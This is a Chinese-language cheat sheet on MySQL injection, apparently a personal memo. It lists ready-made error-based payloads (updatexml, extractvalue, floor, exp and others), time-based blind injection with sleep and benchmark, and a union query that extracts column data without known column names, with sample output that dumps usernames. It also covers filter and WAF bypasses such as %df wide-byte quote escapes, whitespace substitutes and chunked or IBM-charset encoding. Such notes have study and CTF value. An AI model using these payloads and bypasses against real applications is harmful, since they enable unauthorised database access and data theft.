## MYSQL注入 备忘录 ##

字符串截取函数：
```mysql
left(str,index) 从左边index开始截取
right(str,index) 从右边index开始截取
substring(str,index) 从左边index开始截取
substr(str,index,len) 截取str，index开始，截取len的长度
mid(str,index,ken) 截取str从index开始，截取len的长度
```
![kOJzKe.md.png](https://s2.ax1x.com/2019/03/04/kOJzKe.md.png)

字符串比较：
```mysql
strcmp(expr1,expr2) 如果两个字符串是一样返回0，如果第一个小于第二个则返回-1
find_in_set(str,strlist) 如果相同则返回1不同则返回0
```
![kOtdOg.png](https://s2.ax1x.com/2019/03/04/kOtdOg.png)

字符串连接函数：
```mysql
concat(str1,str2) 将字符串首尾相连
concat_ws(separator,str1,str2) 将字符串用指定连接符连接
group_concat(str) 获取全部数据
```
![kOU7QK.png](https://s2.ax1x.com/2019/03/04/kOU7QK.png)

罕见的函数：
```mysql
INSTR(STR,SUBSTR) 在一个字符串(STR)中搜索指定的字符(SUBSTR),返回发现指定的字符的位置(INDEX); 
lpad(str,len,str2) 第一个为要填充的str，len为指定的长度，str2为填充的字符串
```
![kOdruT.png](https://s2.ax1x.com/2019/03/04/kOdruT.png)

使用INSTR或LPAD的盲注：
![kO0b9A.png](https://s2.ax1x.com/2019/03/04/kO0b9A.png)

运算符：
```mysql
+ - * /
```

比较运算符：
```mysql
> = < <> != ><
```

逻辑运算符：
```mysql
not或！非
OR逻辑或== ||
XOR 逻辑异或==^
```
当and被过滤后可以这样操作：
![kOBkj0.png](https://s2.ax1x.com/2019/03/04/kOBkj0.png)

注释符：
```mysql
#
/**/
--+
```

延时函数：
```
sleep()
benchmark(10000,sha(1)) MySQL有一个内置的BENCHMARK()函数，可以测试某些特定操作的执行速度参数可以是需要执行的次数和表达式
```
benchmark可以用来sleep被过滤掉的时候用于盲注
![kOBTbT.png](https://s2.ax1x.com/2019/03/04/kOBTbT.png)

条件语句：
```mysql
if((语句执行),为True执行什么条件，为False执行什么条件)
例子：
and sleep(if((1=2),1,4))
```

information_schema结构：
```mysql
information_schema.tables:
查询表名：table_name 对应表名：table_schema
information_schema.columns:
查询列名：column_name 对应表名：table_name
```

mysql空白字符：
```mysql
   %20 %09 %0a %0b %0c %0d `%a0` /\*\*/ tab/  
   %a0 这个不会被php的\s进行匹配  
   /*!/ 内敛注释  
   \# 这个也可以用来做分隔 挺有意思  
```

编码函数：
```mysql
hex()
ascii()
```

报错注入payload：
```mysql
  1.floor()
        and (select 1 from(select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)

    2.updatexml() //5.1.5
        and 1=(updatexml(1,concat(0x3a,(select user())),1))

    3.extractvalue() //5.1.5
        and extractvalue(1,concat(0x5c,(select user())))

    4.exp() //5.5.5版本之后可以使用
        select host from user where user = 'root' and Exp(~(select * from (select version())a));

    5.name_const //支持老版本
        select * from (select NAME_CONST(version(),0),NAME_CONST(version(),0))x;

    6.geometrycollection()，multipoint()，polygon()，multipolygon()，linestring()，multilinestring() 几何函数报错
        select multipoint((select * from (select * from (select * from (select version())a)b)c));
```

不知道列名的情况下注入：
```mysql
mysql> select * from users where id=0 union select 1,2,3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | 2        | 3        |
+----+----------+----------+
1 row in set (0.00 sec)

mysql> select * from users where id=0 union select 1,(select `2` from (select 1,
2,3 union select * from users)a limit 2,1),3;
+----+----------+----------+
| id | username | password |
+----+----------+----------+
|  1 | Angelina | 3        |
+----+----------+----------+
1 row in set (0.00 sec)

mysql> select * from users where id=0 union select 1,(select group_concat(`2`) f
rom (select 1,2,3 union select * from users)a),3;
+----+--------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------+----------+
| id | username





        | password |
+----+--------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------+----------+
|  1 | 2,Dumb,Angelina,Dummy,secure,stupid,superman,batman,admin,admin1,admin2,a
dmin3,dhakkan,admin4,zr',haq,administrator,demo,zr' and 1=1 #,zrs' and 1=2 #,bbc
' order by 10 #,qw' order by 4 #,weq' order by 3--+,opq' order by 3 #,cs' union
select 1,2,chishi' and 1=2 unio,chishiq' and 1=2 uni,test' union select 1,csq' u
nion select 1,,csqw' and updatexml(,yuis,uio,admq',oepqw' and '1'='1,ggc' order
by 4 #,鏃犲皹' order by 1 #,rqt' order by 3 #,eqwewqe' order by 4 ,eqeqw' union
select    | 3        |
+----+--------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------------------------------------------------------------------------------
--------+----------+
1 row in set (0.00 sec)

```

针对回显不同使用不同的注入方法：
```
1.能够正常回显，能显示出数据，常规注入
2.能够正常回显，无法显示出数据，盲注
3.能够无法正常回显，无法显示出数据，延时盲注
4.在POST里面有注入，burp抓包手注或保存其数据包扔sqlmap跑
```

常用的绕过过滤方法：
```
1.如果是代码层写的过滤，我们可以猜他的过滤条件或正则
   将注入语句逐个删减，看看那个关键词引发的拦截。能否有变的函数来进行代替，过滤注入使用的函    数是preg_replace()还是str_replace() 。如果是前者可以猜其正则，看看能不能绕过，如果后者能否用     变的函数代替，或者有的关键词是被替换成空的。用哪个关键词来分割没被过滤成空的关键词
2.单引号被过滤
   尝试在单引号面前加上%df如果绕过了的话就代表数据库是GBK编码了
3.空格被过滤
  使用代码空格的URL编码或fuzz可以代替空格的编码
4.关键词被过滤
  使用可以代替被过滤函数的函数
5.注释符号被过滤
  手动闭合，假设查询语句为：select * from users where id='1'
  手动闭合注入的payload：' and 1=1 and '1'='1 或者 ' and 1=1 |'1
```

常用的过滤WAF方法：
```
1.隧道传输
2.边界传输
3.分块传输
4.边界+分块
5.边界+分块+注释干扰
6.charset=ibm500、charset=ibm037编码绕过
```